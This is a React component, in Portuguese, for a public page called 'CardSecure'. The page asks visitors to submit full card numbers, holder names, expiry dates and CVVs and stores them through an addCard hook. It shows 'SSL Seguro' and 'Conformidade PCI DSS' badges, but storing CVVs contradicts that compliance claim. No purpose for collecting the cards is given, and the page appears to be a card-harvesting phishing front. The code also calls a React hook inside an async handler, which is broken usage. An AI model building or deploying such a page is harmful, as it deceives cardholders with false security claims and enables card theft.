import { useState } from 'react';
import { CardForm } from '@/components/CardForm';
import { supabaseConfig } from '@/lib/supabase';
import { Shield, Lock, CreditCard, AlertTriangle } from 'lucide-react';
import { motion } from 'framer-motion';
import { ThemeToggle } from '@/components/ThemeToggle';

export function PublicPage() {
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (cardData: {
    card_number: string;
    card_holder: string;
    card_month: string;
    card_year: string;
    card_cvv: string;
    card_type: string;
  }) => {
    setLoading(true);
    try {
      // Import dynamically to avoid issues
      const { useCards } = await import('@/hooks/useCards');
      const { addCard } = useCards();
      const { error } = await addCard(cardData);
      return { error };
    } catch (err) {
      console.error('Submit error:', err);
      return { error: err instanceof Error ? err : new Error('Erro ao processar') };
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 dark:from-slate-950 dark:via-slate-900 dark:to-slate-950 transition-colors duration-300">
      {/* Header */}
      <header className="w-full py-6 px-4 sm:px-6 lg:px-8">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <motion.div 
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            className="flex items-center gap-3"
          >
            <div className="w-10 h-10 bg-blue-500 rounded-xl flex items-center justify-center">
              <CreditCard className="w-6 h-6 text-white" />
            </div>
            <span className="text-xl font-bold text-white">CardSecure</span>
          </motion.div>
          
          <motion.div 
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            className="flex items-center gap-4"
          >
            <div className="flex items-center gap-2 text-slate-300">
              <Lock className="w-4 h-4" />
              <span className="text-sm hidden sm:inline">Conexão Segura</span>
            </div>
            <ThemeToggle />
          </motion.div>
        </div>
      </header>

      {/* Demo Mode Warning */}
      {!supabaseConfig.isConfigured && (
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 mb-4">
          <motion.div 
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-amber-500/10 border border-amber-500/30 rounded-xl p-4 flex items-center gap-3"
          >
            <AlertTriangle className="w-5 h-5 text-amber-500 flex-shrink-0" />
            <div>
              <p className="text-amber-200 font-medium">Modo Demonstração</p>
              <p className="text-amber-200/70 text-sm">
                Configure o Supabase para persistir dados. Os cartões serão salvos apenas neste dispositivo.
              </p>
            </div>
          </motion.div>
        </div>
      )}

      {/* Main Content */}
      <main className="px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
        <div className="max-w-7xl mx-auto">
          <div className="grid lg:grid-cols-2 gap-12 lg:gap-16 items-center">
            {/* Left Side - Info */}
            <motion.div 
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.2 }}
              className="text-center lg:text-left"
            >
              <h1 className="text-4xl sm:text-5xl lg:text-6xl font-bold text-white mb-6 leading-tight">
                Cadastre seu
                <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-cyan-400">
                  {' '}Cartão{' '}
                </span>
                com Segurança
              </h1>
              
              <p className="text-lg sm:text-xl text-slate-300 mb-8 max-w-xl mx-auto lg:mx-0">
                Utilize nossa plataforma segura para cadastrar seus cartões. 
                Todos os dados são criptografados e protegidos.
              </p>

              <div className="flex flex-col sm:flex-row gap-4 justify-center lg:justify-start">
                <div className="flex items-center gap-3 bg-white/10 backdrop-blur-sm rounded-xl px-5 py-4">
                  <div className="w-10 h-10 bg-green-500/20 rounded-lg flex items-center justify-center">
                    <Shield className="w-5 h-5 text-green-400" />
                  </div>
                  <div className="text-left">
                    <p className="text-white font-semibold">SSL Seguro</p>
                    <p className="text-slate-400 text-sm">Criptografia 256-bit</p>
                  </div>
                </div>

                <div className="flex items-center gap-3 bg-white/10 backdrop-blur-sm rounded-xl px-5 py-4">
                  <div className="w-10 h-10 bg-blue-500/20 rounded-lg flex items-center justify-center">
                    <Lock className="w-5 h-5 text-blue-400" />
                  </div>
                  <div className="text-left">
                    <p className="text-white font-semibold">Dados Protegidos</p>
                    <p className="text-slate-400 text-sm">Conformidade PCI DSS</p>
                  </div>
                </div>
              </div>
            </motion.div>

            {/* Right Side - Form */}
            <motion.div 
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.4 }}
              className="relative"
            >
              <div className="absolute inset-0 bg-blue-500/20 blur-3xl rounded-full" />
              <div className="relative">
                <CardForm onSubmit={handleSubmit} loading={loading} />
              </div>
            </motion.div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full py-6 px-4 sm:px-6 lg:px-8 mt-auto">
        <div className="max-w-7xl mx-auto text-center text-slate-400 text-sm">
          <p>© 2024 CardSecure. Todos os direitos reservados.</p>
        </div>
      </footer>
    </div>
  );
}
